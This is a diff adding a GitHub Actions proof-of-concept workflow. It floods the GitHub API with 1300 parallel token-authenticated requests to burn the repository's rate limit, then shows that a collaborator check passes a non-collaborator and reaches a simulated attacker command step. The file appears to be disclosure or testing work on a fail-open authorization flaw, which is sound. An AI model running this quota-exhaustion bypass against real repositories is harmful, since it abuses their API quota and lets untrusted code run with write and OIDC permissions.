@@ -1,0 +1,40 @@
+name: poc-collab-403
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+  issues: write
+  pull-requests: write
+jobs:
+  poc:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 30
+    steps:
+      - name: Show pre-burn rate limit
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: gh api rate_limit --jq '.resources.core'
+      - name: Burn the repo GITHUB_TOKEN quota
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -x
+          seq 1 1300 | xargs -P 25 -I{} sh -c 'curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" https://api.github.com/repos/${{ github.repository }}' | sort | uniq -c
+      - name: Direct checkCollaborator probe after burn
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          for u in octocat Ety60; do
+            echo "--- probe $u"
+            curl -s -o /dev/null -w "status=%{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+              https://api.github.com/repos/${{ github.repository }}/collaborators/$u
+          done
+      - name: Assert is collaborator (copy of target logic) for NON-collaborator octocat
+        uses: ./.github/actions/assert-is-collaborator
+        with:
+          username: octocat
+      - name: Attacker-controlled command step (simulates PR code execution)
+        run: |
+          echo "ATTACKER_COMMAND_REACHED=yes"
+          echo "OIDC/cloud creds present: $(ls -la | wc -l) files"
